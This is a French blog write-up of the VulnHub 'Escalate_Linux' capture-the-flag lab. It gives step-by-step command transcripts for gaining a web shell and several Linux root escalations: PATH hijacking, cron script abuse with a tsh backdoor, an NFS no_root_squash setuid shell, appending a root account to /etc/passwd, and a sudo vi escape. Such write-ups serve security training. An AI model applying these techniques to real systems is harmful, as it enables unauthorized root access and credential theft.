# Solution du CTF Escalate_Linux de VulnHub

Présentation
------------

Proposé par *Manish Gupta* et disponible [sur VulnHub](https://www.vulnhub.com/author/manish-gupta,627/), le CTF *Escalate\_Linux* se présente comme un CTF pour apprendre les techniques d'escalade de privilèges sous Linux.  

Il indique ainsi comporter :  

* 12+ ways of Privilege Escalation
* Vertical Privilege Escalation
* Horizontal Privilege Escalation
* Multi-level Privilege Escalation

Ça semble faire beaucoup :p On va voir de quoi il retourne.  

Inspection générale
-------------------

On lance un scan de port qui remonte rapidement les services Samba, on continue alors avec les outils classiques de la suite Samba :  

```plain
$ nmblookup -A 192.168.3.2
Looking up status of 192.168.3.2
        LINUX           <00> -         B <ACTIVE>
        LINUX           <03> -         B <ACTIVE>
        LINUX           <20> -         B <ACTIVE>
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>
        WORKGROUP       <00> - <GROUP> B <ACTIVE>
        WORKGROUP       <1d> -         B <ACTIVE>
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>

        MAC Address = 00-00-00-00-00-00

$ smbclient  -L 192.168.3.2 -U "" -N
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.7.6-Ubuntu]

        Sharename       Type      Comment
        ---------       ----      -------
        liteshare       Disk
        IPC$            IPC       IPC Service (Linux Lite Shares)
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.7.6-Ubuntu]

        Server               Comment
        ---------            -------
        LINUX                Linux Lite Shares

        Workgroup            Master
        ---------            -------
        WORKGROUP            LINUX

$ smbclient -U "" -N //192.168.3.2/liteshare
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.7.6-Ubuntu]
tree connect failed: NT_STATUS_ACCESS_DENIED
```

On a un nom de machine (Linux), un nom de partage (liteshare) mais 0 accès...  

Entre temps le scan a terminé avec des services supplémentaires :  

```plain
Not shown: 65526 closed ports
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 64
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
111/tcp   open  rpcbind      syn-ack ttl 64
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  3           2049/udp  nfs
|   100003  3,4         2049/tcp  nfs
|   100005  1,2,3      33246/udp  mountd
|   100005  1,2,3      34519/tcp  mountd
|   100021  1,3,4      33947/tcp  nlockmgr
|   100021  1,3,4      36690/udp  nlockmgr
|   100227  3           2049/tcp  nfs_acl
|_  100227  3           2049/udp  nfs_acl
139/tcp   open  netbios-ssn  syn-ack ttl 64
445/tcp   open  microsoft-ds syn-ack ttl 64
2049/tcp  open  nfs          syn-ack ttl 64
33947/tcp open  unknown      syn-ack ttl 64
34519/tcp open  unknown      syn-ack ttl 64
39019/tcp open  unknown      syn-ack ttl 64
40961/tcp open  unknown      syn-ack ttl 64
MAC Address: 08:00:27:62:F1:E2 (Oracle VirtualBox virtual NIC)

| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: osboxes
|   NetBIOS computer name: LINUX
|   Domain name:
|   FQDN: osboxes

```

Evidemment on est tenté par le NFS (partage de fichiers Unix) alors on dégaine showmount :  

```plain
$ showmount -a 192.168.3.2
All mount points on 192.168.3.2:
```

Une nouvelle fois rien à voir :| Il ne nous reste qu'à nous diriger vers le port 80. On lance *gobuster* car on tombe sur la page par défaut d'Apache :  

```plain
$ gobuster -u http://192.168.3.2/ -w raft-large-files.txt -s 200,204,301,302,307,403,401
/shell.php (Status: 200)
```

Ce script nous indique de passer une variable *cmd* alors on s'exécute... et lui exécute :)   

![Vulnhub Escalate_Linux CTF first shell](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/privesc_ctf_phpshell.png)

C'est aussi simple que cela !  

Le nom d'utilisateur avec une fin numérique laisse présager d'autres utilisateurs du même acabit. Ça ne rate pas :  

```plain
user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
mysql:x:121:131:MySQL Server,,,:/var/mysql:/bin/bash
```

On remarque que *user7* fait partie du groupe root. Et aussi qu'un mysql tourne en local.  

Tous les utilisateurs *user\** ont leur dossier dans /home avec un umask permissif permettant d'aller fouiller à droite à gauche :  

```plain
drwxr-xr-x 22 user1 user1 4096 Jun  3 13:39 user1
drwxr-xr-x 22 user2 user2 4096 Jun  3 13:40 user2
drwxr-xr-x 22 user3 user3 4096 Jun  4 13:37 user3
drwxr-xr-x 22 user4 user4 4096 Jun  4 15:10 user4
drwxr-xr-x 22 user5 user5 4096 Jun  4 16:27 user5
drwxr-xr-x 22 user6 user6 4096 Jun  4 15:46 user6
drwxr-xr-x 22 user7 root  4096 Jun  5 13:43 user7
drwxr-xr-x 22 user8 user8 4096 Jun  5 16:39 user8
```

En allant fouiller dans les groupes on voit que user4 est aussi dans le groupe root en plus de son groupe à lui :  

```plain
uid=1003(user4) gid=1003(user4) groups=1003(user4),0(root)
```

Vu que SSH n'est pas présent sur la machine j'ai d'abord utilisé [une backdoor python avec support PTY](https://github.com/infodox/python-pty-shells) mais celle-ci s'est montrée peu stable (vraisemblablement vis à vis de la personnalisation du prompt qui contenait des séquences non-ascii).  

Finalement j'ai récupéré et recompilé [tsh](https://github.com/creaktive/tsh) car comme dis le proverbe c'est dans les vieux codes sources qu'on fait les meilleures backdoors :D  

Eight unprivileged accounts, many possibilities
-----------------------------------------------

En fouillant dans les dossiers on voit vite que ça va être un vrai supplice d'énumérer à la mano les fichiers. Le créateur du CTF a du se connecter à chaque account via l'interface graphique et lancer différentes applis (Firefox notamment) du coup on trouve beaucoup de fichiers qui nous sont inutiles.  

[LinEnum.sh](https://github.com/rebootuser/LinEnum) fera pour nous le gros du boulot.  

The MySQL way
-------------

```plain
[+] We can connect to the local MYSQL service with default root/root credentials!
mysqladmin  Ver 8.42 Distrib 5.7.26, for Linux on x86_64
Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Server version          5.7.26-0ubuntu0.18.04.1
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/run/mysqld/mysqld.sock
Uptime:                 44 min 0 sec

Threads: 1  Questions: 6  Slow queries: 0  Opens: 105  Flush tables: 1  Open tables: 98  Queries per second avg: 0.002
```

On peut utiliser ces credentials pour fouiller dans le base SQL :  

```plain
user6@osboxes:/var/www/html$ mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.7.26-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| user               |
+--------------------+
5 rows in set (0.05 sec)

mysql> use user;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_user |
+----------------+
| user_info      |
+----------------+
1 row in set (0.00 sec)

mysql> select * from user_info;
+----------+-------------+
| username | password    |
+----------+-------------+
| mysql    | mysql@12345 |
+----------+-------------+
1 row in set (0.00 sec)
```

Passer *mysql* nous amène à de nombreux mots de passe :  

```plain
mysql@osboxes:~$ ls -al
total 28
drwxr-xrwx  4 root  root  4096 Jul  6 16:25 .
drwxr-xr-x 14 root  root  4096 Jun  5 16:36 ..
-rw-------  1 mysql mysql  235 Jun  6 14:18 .bash_history
-rw-------  1 mysql mysql    3 Jun  6 14:18 db.txt.save
drwx------  3 mysql mysql 4096 Jul  6 16:25 .gnupg
drwxrwxr-x  3 mysql mysql 4096 Jun  6 14:15 .local
----------  1 mysql mysql  126 Jun  6 14:17 .user_informations

mysql@osboxes:~$ chmod 600 .user_informations
mysql@osboxes:~$ cat .user_informations
user2:user2@12345
user3:user3@12345
user4:user4@12345
user5:user5@12345
user6:user6@12345
user7:user7@12345
user8:user8@12345
```

User2 vers user1 vers root
--------------------------

On se connecte en *user2* et on voit qu'on peut passer *user1* via sudo :  

```plain
$ sudo -l
[sudo] password for user2:
Matching Defaults entries for user2 on osboxes:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user2 may run the following commands on osboxes:
    (user1) ALL
```

Un *sudo -u user1 bash* plus tard on relève la présence de la commande *sudo cat /etc/shadow* dans l'historique de *user1*.  

On exécute cette commande mais le mot de passe de *user1* est demandé... On teste *user1@12345* et BINGO ça passe. On peut passer root de la même façon.  

User3 vers root
---------------

Cet utilisateur dispose d'un binaire setuid 0 dans son dossier personnel. Il semble qu'il effectue un *system()* du script bash *.script.sh* présent dans le même dossier.  

```bash
echo "You Can't Find Me"
bash -i
```

Dès lors il nous suffit de lancer le binaire :  

```plain
 user3  ~  ./shell
You Can't Find Me
Welcome to Linux Lite 4.4 user3

Saturday 06 July 2019, 16:59:03
Memory Usage: 287/985MB (29.14%)
Disk Usage: 5/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)

 root  ~  id
uid=0(root) gid=0(root) groups=0(root),1002(user3)
 root  ~  head /etc/shadow
root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::
daemon:x:17995:0:99999:7:::
bin:x:17995:0:99999:7:::
sys:x:17995:0:99999:7:::
sync:x:17995:0:99999:7:::
games:x:17995:0:99999:7:::
man:x:17995:0:99999:7:::
lp:x:17995:0:99999:7:::
mail:x:17995:0:99999:7:::
news:x:17995:0:99999:7:::
```

User4 vers root
---------------

LinEnum aura relevé cette entrée dans la *crontab* :  

```bash
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
```

Le contenu de ce fichier est le suivant :  

```bash
touch /home/user4/abc.txt
echo "I will automate the process"
bash -i
```

Je vois bien le timestamp sur le fichier */home/user4/abc.txt* être modifié toutes les 5 minutes malgré cela mes éditions sur le script n'ont pas permis de faire exécuter mes commandes :-/  

J'ai essayé de rajouter le [shebang](https://fr.wikipedia.org/wiki/Shebang) mais aucune commande n'était exécutée... C'est même étonnant que la commande *touch* fonctionnait jusque là.  

La *crontab* devrait appeler le fichier avec *bash -c*. Je n'ai pas la solution à ce mystère de pourquoi le *touch* fonctionnait, quoiqu'il en soit en recompilant *tshd* pour qu'il utilise un autre port et en plaçant le binaire à */home/user4/Desktop/autoscript.sh* il était bien exécuté.  

```plain
$ ./tsh 192.168.3.2
Welcome to Linux Lite 4.4

You are running in superuser mode, be very careful.

Saturday 06 July 2019, 20:50:18
Memory Usage: 308/985MB (31.27%)
Disk Usage: 6/217GB (3%)

 root  ~  id
uid=0(root) gid=0(root) groups=0(root)
```

User5 vers root
---------------

Cet utilisateur dispose lui aussi d'un binaire setuid 0 nommé *script*.  

```plain
$ ./script 
Desktop  Documents  Downloads  ls  Music  Pictures  Public  script  Templates  Videos
```

Ce binaire appelle la commande *ls* mais celle du système, pas le script du même nom dans le dossier utilisateur avec ce contenu :  

```bash
id
whoami
cat /etc/shadow
```

On peut forcer l'utilisation du *ls* sous notre contrôle en changeant le PATH :  

```plain
$ PATH=.:$PATH ./script 
uid=0(root) gid=0(root) groups=0(root),1004(user5)
root
root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::
--- snip ---
```

User5 vers root (via NFS)
-------------------------

La commande *showmount* a échouée, il n'en reste pas moins que *LinEnum* a vu l'existence d'un point de montage :  

```plain
[-] NFS config details:
-rw-r--r-- 1 root root 423 Jun  4 15:02 /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/user5 *(rw,no_root_squash)
```

Depuis ma machine je monte le partage en root et j'y place un shell setuid 0. Ma machine est celle du CTF sont sous la même architecture (x86\_64) donc aucune difficulté.  

```plain
root@kwak:/tmp# cd
root@kwak:~# cd /tmp/
root@kwak:/tmp# mkdir yolo
root@kwak:/tmp# mount -t nfs 192.168.3.2:/home/user5 yolo
root@kwak:/tmp# cd yolo/
root@kwak:/tmp/yolo# cp /bin/bash backdoor
root@kwak:/tmp/yolo# chmod 4755 backdoor
```

Et depuis la cible :  

```plain
 user5  ~  ls -l
total 200
-rwsr-xr-x 1 root  root  154072 Jul  6 21:12 backdoor
drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Desktop
drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Documents
drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Downloads
-rwxrwxr-x 1 user5 user5     34 Jul  6 19:06 ls
drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Music
drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Pictures
drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Public
-rwsr-xr-x 1 root  root    8392 Jun  4 15:57 script
drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Templates
drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Videos
 user5  ~  ./backdoor -p
# id
uid=1004(user5) gid=1004(user5) euid=0(root) groups=1004(user5)
```

User7 vers root
---------------

Faisant partie du groupe root on va bien trouver un fichier quelconque pour notre escalade de privilège...  

```plain
$ find /etc/ -writable -type f  2> /dev/null
/etc/papersize
/etc/hostname
/etc/default/keyboard
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/skel/.config/mimeapps.list
/etc/skel/.config/xfce4/desktop/icons.screen0-1350x721.rc
/etc/skel/.config/xfce4/panel/whiskermenu-10.rc
/etc/skel/.config/xfce4/panel/datetime-2.rc
/etc/relinux/relinux.conf
/etc/relinux/relinux/wubi/wubi.exe
/etc/relinux/relinux/isolinux/isolinux.cfg.vesamenu
/etc/relinux/relinux/splash/splash.png
/etc/relinux/relinux/version
/etc/relinux/relinux/preseed/custom.seed
/etc/passwd
/etc/timezone
/etc/fstab
/etc/passwd-
/etc/hosts
$ openssl passwd -1 -salt user9 s3cr3t
$1$user9$JUQJ5MIu8N.kJJmfhHrfc0
$ echo 'user9:$1$user9$JUQJ5MIu8N.kJJmfhHrfc0:0:0:/root:/bin/bash' >> /etc/passwd
```

Plus qu'à se connecter avec nos nouveaux identifiants (*user9 / s3cr3t*) :

```plain
$ su user9
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
```

User8 vers root
---------------

```plain
 user8  ~  id
uid=1007(user8) gid=1007(user8) groups=1007(user8)
 user8  ~  sudo -l
Matching Defaults entries for user8 on osboxes:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on osboxes:
    (root) NOPASSWD: /usr/bin/vi
 user8  ~  sudo /usr/bin/vi

--- une fois dans Vi on tape :!sh<entrée>

# id
uid=0(root) gid=0(root) groups=0(root)
```

Tous les chemins mènent à root
------------------------------

CTF très classique et basique, quelques privesc originales auraient été les bienvenues.

*Published July 09 2019 at 18:06*